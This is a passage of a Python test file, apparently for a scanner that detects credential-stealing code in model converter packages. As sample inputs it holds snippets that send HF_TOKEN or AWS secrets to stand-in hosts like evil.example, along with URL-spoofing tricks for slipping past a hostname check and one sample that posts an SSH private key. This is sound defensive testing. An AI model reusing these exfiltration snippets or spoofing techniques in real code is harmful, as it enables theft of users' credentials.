        'requests.get(HUB, headers = {"a": t, "b": env["AWS_SECRET_ACCESS_KEY"]})\n'
    )
    assert _findings(
        'def f(e):\n'
        '    return e["AWS_SECRET_ACCESS_KEY"]\n'
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"a": os.environ["HF_TOKEN"], "b": f(os.environ)},\n'
        ')\n'
    )

    # And when the collected set is genuinely EMPTY: os.environ reached through
    # a call this does not read, with the rule firing on the comment. An empty
    # set satisfies the subset check on its own, so without the emptiness test
    # this is allowed.
    assert _findings(
        'os.environ.setdefault("HF_HOME", "/tmp")  # TOKEN\n'
        'requests.get(HUB)\n'
    )

    # And only os.environ counts as the environment. Any object's .get() did,
    # so an ordinary config.get("API_KEY") beside a normal hub download read as
    # an environment secret and put the false positive straight back.
    assert _findings(
        'config = {}\n'
        'k = config.get("API_KEY")\n'
        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []
    assert _findings(
        'requests.get(HUB, headers = {"a": os.getenv("HF_TOKEN")})\n'
    ) == []

    # The shape upstream has: a hub token, sent as authentication, on a read.
    assert _findings(
        'requests.get(HUB, headers = {"Authorization": "Bearer " + os.environ["HF_TOKEN"]})\n'
    ) == []
    assert _findings(
        'requests.head(HUB, headers = {"Authorization": os.environ.get("HF_TOKEN")})\n'
    ) == []


def test_urllib_refuses_the_hub_allowance():
    """urllib expresses a write as Request(..., data = ...), Request(...,
    method = "POST") or urlopen(..., data = ...). None of those is an attribute
    called post, so the write check cannot see them, and a request sending
    HF_TOKEN to a writable hub endpoint kept its allowance. urllib appears
    nowhere in the real gguf-py or conversion packages, so refusing on it costs
    nothing upstream.
    """
    scan_converter_source = _load(
        "converter_scan_urllib_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    hub = 'HUB = "https://huggingface.co/api/models"\n'

    for body in (
        'urllib.request.urlopen(HUB, data = os.environ["HF_TOKEN"].encode())\n',
        'r = urllib.request.Request(\n'
        '    HUB, data = os.environ["HF_TOKEN"].encode(), method = "POST",\n'
        ')\n',
        'urllib.request.urlopen(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n',
    ):
        assert [
            f.check for f in scan_converter_source(
                'import os\nimport urllib.request\n' + hub + body
            )
        ], body


def test_the_hub_narrowing_does_not_reach_any_other_rule():
    """Only the env-harvest combination is narrowed. A credential stealer or a
    remote-code loader that happens to mention the hub is untouched.
    """
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    creds = (
        'import requests\n'
        'BASE_DOMAIN = "https://huggingface.co"\n'
        'data = open("/root/.ssh/id_rsa").read()\n'
        'requests.post(BASE_DOMAIN, data = data)\n'
    )
    assert any("credential paths" in f.check for f in scan_converter_source(creds)), (
        [f.check for f in scan_converter_source(creds)]
    )


def test_the_hub_allowance_reads_the_real_hostname():
    """Reads throughout, deliberately: the allowance refuses a write to the hub
    outright, so a POST here would make every case pass without the hostname
    check doing anything.

    `https://huggingface.co:443@evil.example/collect` sends the request to
    evil.example: everything before the @ is user information. Taking the
    authority up to the first colon read it as huggingface.co, which turned the
    allowance into a way to post HF_TOKEN anywhere and have this say nothing.
    """
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    def _findings(url):
        return [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                f'URL = "{url}"\n'
                'requests.get(URL, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
            )
        ]

    assert _findings("https://huggingface.co:443@evil.example/collect"), (
        "userinfo before the @ must not stand in for the hostname"
    )
    # A host that merely starts with the hub's name is a different host.
    assert _findings("https://huggingface.co.evil.example/collect")
    # A URL with no host at all names no destination, so nothing is suppressed.
    assert _findings("https:///collect")
    # And it still counts when it sits beside a real hub URL, which is the shape
    # that matters: dropping hostless URLs instead of recording them let one be
    # hidden behind a hub link in the same file.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co/api/models"\n'
            'OUT = "https:///collect"\n'
            'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
        )
    ]

    # A scheme requests accepts is a scheme this has to read. requests
    # normalizes HTTPS://, so a lowercase-only pattern let the destination be
    # spelled past the check. It has to be tested BESIDE a hub literal: on its
    # own the file names no host this can see, which is not suppressed anyway,
    # so the case passes whether or not the scheme is read.
    def _beside_the_hub(destination):
        return [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                'HUB = "https://huggingface.co/api/models"\n'
                f'OUT = {destination}\n'
                'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
            )
        ]

    assert _beside_the_hub('"HTTPS://evil.example/collect"')
    assert _beside_the_hub('"HtTpS://evil.example/collect"')
    assert _beside_the_hub('"https://evil.example/collect"')
    assert _beside_the_hub('"https://huggingface.co/api/models"') == []

    # The shapes that really are the hub still pass, port and case included.
    assert _findings("https://huggingface.co/api/models") == []
    assert _findings("https://huggingface.co:443/api/models") == []
    assert _findings("https://HuggingFace.CO/api/models") == []

    # bytes are URLs too: requests decodes b"https://..." and accepts it, so a
    # destination in a bytes literal was invisible beside a str hub literal.
    assert _beside_the_hub('b"https://evil.example/collect"')

    # A backslash is part of the URL, not a place to stop reading it. Both
    # urlsplit and httpx resolve this to evil.example, and httpx is a sink the
    # network rule already recognises, so stopping at the backslash recorded
    # only the hub and suppressed the finding.
    # Whatever is between the scheme and the first URL delimiter has to LOOK like
    # a hostname. Four review rounds found five spellings that ended the match
    # early and left only the hub recorded, so the check is no longer a list of
    # characters to stop at: user information before an @, an uppercase scheme, a
    # bytes literal, a backslash and a space each stay inside the authority now,
    # where they fail to look like a host and the allowance is refused. urlsplit
    # and httpx both resolve every one of these to evil.example.
    for separator in (chr(92), " ", chr(9), chr(10), "%20"):
        assert _beside_the_hub(
            '"https://huggingface.co' + separator + '@evil.example/collect"'
        ), f"a {separator!r} in the authority must refuse the allowance"

    # A destination spelled across `+` or `%` is still spelled out in full, and
    # ast.parse does not fold either, so each operand named no host and a hub
    # literal elsewhere in the file granted the allowance over a URL that reads
    # as evil.example to every client. Folding an operand that is not a literal
    # is not possible, which leaves that case where the dynamic destinations
    # already are.
    assert _beside_the_hub('"https://" + "evil.example/collect"')
    assert _beside_the_hub('"htt" + "ps://evil.example/collect"')
    assert _beside_the_hub('"https://" + "evil.example" + "/collect"')
    assert _beside_the_hub('b"https://" + b"evil.example/collect"')
    assert _beside_the_hub('"%s://%s/collect" % ("https", "evil.example")')
    assert _beside_the_hub('"https://%s/collect" % ("evil.example",)')

    # The hub spelled the same way is still the hub. A fold has to REPLACE its
    # operands: reading "https://hugging" as a host called `hugging` beside the
    # folded hub refuses a file that never names anything else, which is the
    # false positive this narrowing exists to remove.
    assert _beside_the_hub('"https://huggingface.co" + "/api/models"') == []
    assert _beside_the_hub('"https://hugging" + "face.co/api/models"') == []
    assert _beside_the_hub('"%s/api/models" % ("https://huggingface.co",)') == []

    # Only %s, %r and %% are folded: "%2000000000d" % 1 is a two gigabyte string,
    # and scanning a file is not a reason to allocate one.
    assert _beside_the_hub('"%2000000000d" % 1') == []
